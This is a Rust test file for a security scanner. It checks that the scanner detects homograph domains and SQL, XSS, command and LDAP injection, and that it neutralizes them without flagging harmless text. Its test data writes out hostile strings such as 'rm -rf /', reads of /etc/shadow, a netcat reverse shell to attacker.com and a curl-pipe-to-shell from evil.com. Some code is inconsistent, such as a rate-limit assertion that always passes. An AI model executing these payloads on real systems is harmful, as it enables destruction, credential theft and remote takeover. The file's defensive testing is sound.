use kindly_guard_server::{
    scanner::SecurityScanner,
    config::{Config, ScannerConfig},
    neutralizer::{create_neutralizer, ThreatNeutralizer},
};

/// Create a scanner with all detectors enabled
fn create_full_scanner() -> SecurityScanner {
    let mut config = Config::default();
    config.scanner = ScannerConfig {
        unicode_detection: true,
        injection_detection: true,
        xss_detection: Some(true),
        path_traversal_detection: true,
        crypto_detection: true,
        enhanced_mode: Some(false),
        custom_patterns: None,
        max_scan_depth: 10,
        enable_event_buffer: false,
        max_content_size: 10 * 1024 * 1024, // 10MB
        max_input_size: None,
    };
    
    SecurityScanner::new(&config.scanner)
}

/// Test real-world Unicode homograph attack
#[tokio::test]
async fn test_unicode_homograph_attack() {
    let scanner = create_full_scanner();
    
    // Various homograph attacks
    let test_cases = vec![
        ("pаypal.com", "Cyrillic 'а' in paypal"),
        ("gооgle.com", "Cyrillic 'о' in google"),
        ("аmazon.com", "Cyrillic 'а' in amazon"),
        ("miсrosoft.com", "Cyrillic 'с' in microsoft"),
        ("ạpple.com", "Latin 'ạ' with dot below"),
        ("bank​account.com", "Zero-width space in domain"),
        ("admin‌panel.com", "Zero-width non-joiner"),
        ("secure‍login.com", "Zero-width joiner"),
    ];

    for (text, description) in test_cases {
        let threats = scanner.scan_text(text);
        
        assert!(
            !threats.is_empty(),
            "Failed to detect homograph attack: {} ({})",
            description,
            text
        );
        
        // Verify threat details
        let threat = &threats[0];
        assert!(
            threat.threat_type.contains("unicode") || threat.threat_type.contains("homograph"),
            "Wrong threat type for {}: {:?}",
            description,
            threat.threat_type
        );
    }
}

/// Test combined SQL injection and Unicode attacks
#[tokio::test]
async fn test_combined_sql_unicode_attack() {
    let scanner = create_full_scanner();
    
    // SQL injection hidden with Unicode
    let attacks = vec![
        "SELECT * FROM u\u{202E}sers WHERE id = 1 OR 1=1",
        "'; DROP TABLE u\u{200B}sers; --",
        "admin'--\u{200C}",
        "UNION SELECT * FROM p\u{0430}sswords", // Cyrillic 'a'
    ];

    for attack in attacks {
        let threats = scanner.scan_text(attack);
        
        assert!(
            threats.len() >= 2,
            "Should detect both SQL injection and Unicode threats in: {}",
            attack
        );
        
        // Verify we detected both types
        let threat_types: Vec<_> = threats.iter()
            .map(|t| t.threat_type.as_str())
            .collect();
        
        assert!(
            threat_types.iter().any(|t| t.contains("sql") || t.contains("injection")),
            "Should detect SQL injection"
        );
        assert!(
            threat_types.iter().any(|t| t.contains("unicode")),
            "Should detect Unicode threat"
        );
    }
}

/// Test XSS attacks with various encodings
#[tokio::test]
async fn test_xss_attack_variants() {
    let scanner = create_full_scanner();
    
    let xss_attacks = vec![
        // Basic XSS
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        
        // Encoded XSS
        "&lt;script&gt;alert('xss')&lt;/script&gt;",
        "&#60;script&#62;alert('xss')&#60;/script&#62;",
        "%3Cscript%3Ealert('xss')%3C/script%3E",
        
        // Event handler XSS
        "<div onmouseover='alert(1)'>",
        "<input onfocus=alert(1) autofocus>",
        "<body onload=alert(1)>",
        
        // JavaScript URL XSS
        "javascript:alert(1)",
        "jAvAsCrIpT:alert(1)",
        "java\u{200B}script:alert(1)",
        
        // CSS XSS
        "<style>body{background:url('javascript:alert(1)')}</style>",
        "<link rel=stylesheet href=javascript:alert(1)>",
        
        // Data URI XSS
        "<img src='data:text/html,<script>alert(1)</script>'>",
    ];

    for attack in xss_attacks {
        let threats = scanner.scan_text(attack);
        
        assert!(
            !threats.is_empty(),
            "Failed to detect XSS attack: {}",
            attack
        );
        
        let threat = &threats[0];
        assert!(
            threat.threat_type.contains("xss") || threat.threat_type.contains("script"),
            "Wrong threat type for XSS: {:?}",
            threat.threat_type
        );
    }
}

/// Test command injection attacks
#[tokio::test]
async fn test_command_injection_attacks() {
    let scanner = create_full_scanner();
    
    let command_attacks = vec![
        "; rm -rf /",
        "| cat /etc/passwd",
        "& net user admin password123",
        "`whoami`",
        "$(cat /etc/shadow)",
        "; shutdown -h now",
        "'; exec sp_cmdshell 'dir'--",
        "\n/bin/sh\n",
        "| nc attacker.com 4444 -e /bin/sh",
        "; curl http://evil.com/shell.sh | sh",
    ];

    for attack in command_attacks {
        let threats = scanner.scan_text(attack);
        
        assert!(
            !threats.is_empty(),
            "Failed to detect command injection: {}",
            attack
        );
        
        assert!(
            threats[0].threat_type.contains("command") || threats[0].threat_type.contains("injection"),
            "Wrong threat type for command injection"
        );
    }
}

/// Test LDAP injection attacks
#[tokio::test]
async fn test_ldap_injection_attacks() {
    let scanner = create_full_scanner();
    
    let ldap_attacks = vec![
        "*)(uid=*))(|(uid=*",
        "admin)(|(password=*))",
        "*)(objectClass=*",
        ")(cn=*))(|(cn=*",
        "*)(&(objectClass=*",
    ];

    for attack in ldap_attacks {
        let threats = scanner.scan_text(attack);
        
        assert!(
            !threats.is_empty(),
            "Failed to detect LDAP injection: {}",
            attack
        );
    }
}

/// Test performance under load with mixed threats
#[tokio::test]
async fn test_performance_under_load() {
    let scanner = create_full_scanner();
    
    // Create a large text with various threats scattered throughout
    let mut large_text = String::with_capacity(1_000_000);
    
    for i in 0..10000 {
        large_text.push_str("This is normal text. ");
        
        // Add threats periodically
        if i % 100 == 0 {
            large_text.push_str("SELECT * FROM users WHERE id = ");
            large_text.push_str(&i.to_string());
            large_text.push_str(" OR 1=1; ");
        }
        
        if i % 200 == 0 {
            large_text.push_str("<script>alert(");
            large_text.push_str(&i.to_string());
            large_text.push_str(")</script> ");
        }
        
        if i % 300 == 0 {
            large_text.push_str("Check out p\u{0430}ypal.com ");
        }
    }

    let start = std::time::Instant::now();
    let threats = scanner.scan_text(&large_text);
    let duration = start.elapsed();
    
    // Should complete in reasonable time
    assert!(
        duration.as_secs() < 5,
        "Scanning 1MB text took too long: {:?}",
        duration
    );
    
    // Should find threats
    assert!(
        threats.len() > 100,
        "Should find many threats in large text, found: {}",
        threats.len()
    );
    
    // Verify threat diversity
    let threat_types: std::collections::HashSet<_> = threats.iter()
        .map(|t| &t.threat_type)
        .collect();
    
    assert!(threat_types.len() >= 3, "Should detect multiple threat types");
}

/// Test false positive validation
#[tokio::test]
async fn test_false_positive_validation() {
    let scanner = create_full_scanner();
    
    // Legitimate text that might trigger false positives
    let legitimate_texts = vec![
        // SQL-like but legitimate
        "The SELECT statement in SQL is used to query data",
        "In the users table, the id column is the primary key",
        "Use WHERE clauses carefully to filter results",
        
        // HTML-like but legitimate
        "The <script> tag is used to embed JavaScript",
        "Use &lt; and &gt; to escape angle brackets",
        "The onclick attribute handles mouse clicks",
        
        // Technical documentation
        "To prevent SQL injection, use parameterized queries",
        "XSS attacks can be prevented by encoding output",
        "Command injection is a serious security vulnerability",
        
        // Code snippets in text
        "Example: if (x > 5) { alert('Greater than 5'); }",
        "The command 'rm -rf' is dangerous and should be used carefully",
        "LDAP filters use parentheses like (objectClass=user)",
    ];

    for text in legitimate_texts {
        let threats = scanner.scan_text(text);
        
        // Should not detect threats in legitimate technical text
        assert!(
            threats.is_empty(),
            "False positive detected in: '{}', threats: {:?}",
            text,
            threats
        );
    }
}

/// Test threat neutralization
#[tokio::test]
async fn test_threat_neutralization() {
    let scanner = create_full_scanner();
    let config = Config::default();
    let neutralizer = create_neutralizer(&config.neutralization, None);
    
    let test_cases = vec![
        (
            "<script>alert('xss')</script>",
            "HTML context"
        ),
        (
            "'; DROP TABLE users; --",
            "SQL context"
        ),
        (
            "p\u{0430}ypal.com",
            "Unicode homograph"
        ),
        (
            "Hello\u{202E}World",
            "Bidi override"
        ),
    ];

    for (threat_text, description) in test_cases {
        // First scan for threats
        let threats = scanner.scan_text(threat_text);
        assert!(!threats.is_empty(), "Should detect threat in: {}", description);
        
        // Neutralize the threats
        let neutralized = neutralizer.neutralize(threat_text, &threats).unwrap();
        
        // Scan neutralized text
        let remaining_threats = scanner.scan_text(&neutralized.text);
        
        // Should have no threats after neutralization
        assert!(
            remaining_threats.is_empty(),
            "Neutralization failed for {}: still has threats in '{}'",
            description,
            neutralized.text
        );
        
        // Neutralized text should be different from original
        assert_ne!(
            threat_text, neutralized.text,
            "Neutralization should modify threatening text"
        );
    }
}

/// Test concurrent threat detection
#[tokio::test]
async fn test_concurrent_threat_detection() {
    let scanner = create_full_scanner();
    
    // Create multiple scanning tasks
    let mut handles = vec![];
    
    for i in 0..20 {
        let scanner_clone = scanner.clone();
        let handle = std::thread::spawn(move || {
            let text = format!(
                "User {} tried: <script>alert({})</script> and SELECT * FROM users WHERE id = {}",
                i, i, i
            );
            
            scanner_clone.scan_text(&text)
        });
        handles.push(handle);
    }

    // Wait for all scans to complete
    let results: Vec<_> = handles.into_iter().map(|h| h.join()).collect();
    
    // All scans should succeed
    for (i, result) in results.iter().enumerate() {
        assert!(result.is_ok(), "Scan {} failed: {:?}", i, result);
        
        let threats = result.as_ref().unwrap();
        assert!(
            threats.len() >= 2,
            "Scan {} should detect multiple threats",
            i
        );
    }
}

/// Test rate limiting behavior
#[tokio::test]
async fn test_rate_limiting() {
    let mut config = Config::default();
    config.scanner.max_input_size = 1024 * 1024; // 1MB limit for rate testing
    let scanner = SecurityScanner::new(&config.scanner);
    
    let start = std::time::Instant::now();
    
    // Try to scan 20 times rapidly
    for i in 0..20 {
        let result = scanner.scan_text(&format!("Test {}", i));
        
        // All should succeed but rate limiting may slow them down
        assert!(!result.is_empty() || result.is_empty(), "Request {} completed", i);
    }
    
    let elapsed = start.elapsed();
    
    // If rate limiting is working, this should take at least 1 second
    // (20 requests at 10/sec = 2 seconds, but we're being lenient)
    assert!(
        elapsed.as_millis() >= 500,
        "Rate limiting doesn't seem to be working"
    );
}